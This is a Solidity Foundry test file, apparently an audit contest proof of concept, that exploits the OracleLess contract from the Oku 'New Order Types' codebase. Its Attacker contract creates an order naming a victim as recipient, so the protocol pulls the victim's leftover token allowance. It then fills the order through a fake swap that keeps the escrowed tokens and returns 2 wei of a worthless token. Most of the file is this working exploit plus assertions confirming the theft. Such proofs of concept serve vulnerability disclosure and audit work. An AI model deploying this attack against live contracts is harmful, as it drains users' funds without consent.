// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Real audited source, compiled from the Oku "New Order Types" contest repo
// (sherlock-audit/2024-11-oku @ ee3f781a73d65e33fb452c9a44eb1337c5cfdbd6),
// vendored verbatim under src/oku/contracts/. OracleLess is the real contract;
// nothing on the exploit path is stubbed.
import "../src/oku/contracts/automatedTrigger/OracleLess.sol";
import "../src/oku/contracts/automatedTrigger/AutomationMaster.sol";
import "../src/oku/contracts/interfaces/openzeppelin/IERC20.sol";
import "forge-std/Test.sol";

/// Minimal real ERC20 for the opaque tokenIn/tokenOut.
contract TestToken is IERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory _n, string memory _s) {
        name = _n;
        symbol = _s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/// The attacker: creates an order in the VICTIM's name (procureTokens pulls from
/// the order recipient, not msg.sender), then fills it against itself, keeping the
/// victim's tokenIn and handing back a dust amount of a worthless tokenOut.
contract Attacker {
    OracleLess public immutable oracleLess;
    IERC20 public immutable tokenIn;
    IERC20 public immutable tokenOut;
    uint96 public orderId;
    uint256 public amountIn;

    constructor(OracleLess _o, IERC20 _in, IERC20 _out) {
        oracleLess = _o;
        tokenIn = _in;
        tokenOut = _out;
    }

    // Step 1: OracleLess.procureTokens() calls tokenIn.safeTransferFrom(recipient, ...)
    // so passing the victim as `recipient` spends the victim's residual allowance.
    function steal(address victim, uint256 _amountIn) external {
        amountIn = _amountIn;
        // minAmountOut = 1 so a 2-wei tokenOut "swap" clears the execute() check.
        orderId = oracleLess.createOrder(tokenIn, tokenOut, _amountIn, 1, victim, 0, false, "");
    }

    // Step 2: fill the order, routing the swap to this contract.
    function drain(uint96 pendingIdx) external {
        oracleLess.fillOrder(pendingIdx, orderId, address(this), abi.encodeWithSelector(this.swap.selector));
    }

    // The "swap": OracleLess approved us `amountIn` of tokenIn, so take it, and
    // return the minimum dust of the worthless tokenOut we already own.
    function swap() external {
        tokenIn.transferFrom(msg.sender, address(this), amountIn); // msg.sender == OracleLess
        tokenOut.transfer(msg.sender, 2);
    }
}

contract PoC_44378 is Test {
    OracleLess oracleLess;
    AutomationMaster master;
    TestToken tokenIn;
    TestToken tokenOut;
    Attacker attacker;
    address victim = address(0xA11CE);

    function setUp() public {
        master = new AutomationMaster();
        oracleLess = new OracleLess(master, IPermit2(address(0)));
        tokenIn = new TestToken("Valuable", "VAL");
        tokenOut = new TestToken("Worthless", "WORTH");
        attacker = new Attacker(oracleLess, tokenIn, tokenOut);

        // Victim holds 100e18 of the valuable token and has a leftover approval to
        // the protocol (e.g. an over-approval from an earlier intended trade).
        tokenIn.mint(victim, 100 ether);
        vm.prank(victim);
        tokenIn.approve(address(oracleLess), 100 ether);

        // Attacker owns a dust amount of the worthless token used to "settle" the fill.
        tokenOut.mint(address(attacker), 2);
    }

    function test_attacker_steals_victim_tokens_via_recipient_transferFrom() public {
        // 1) Attacker creates an order in the victim's name, spending their allowance.
        attacker.steal(victim, 100 ether);
        assertEq(tokenIn.balanceOf(victim), 0, "victim's tokens pulled without consent");
        assertEq(tokenIn.balanceOf(address(oracleLess)), 100 ether, "escrow now in protocol");

        // 2) Attacker fills the order against itself and takes the escrow.
        attacker.drain(0);

        // Concrete harm: attacker gained the victim's 100e18; the victim got 2 wei of
        // a worthless token in return. This is a direct, permissionless token theft.
        assertEq(tokenIn.balanceOf(address(attacker)), 100 ether, "attacker stole the victim's 100e18");
        assertEq(tokenIn.balanceOf(victim), 0, "victim lost everything");
        assertEq(tokenOut.balanceOf(victim), 2, "victim received only 2 wei of a worthless token");
    }
}
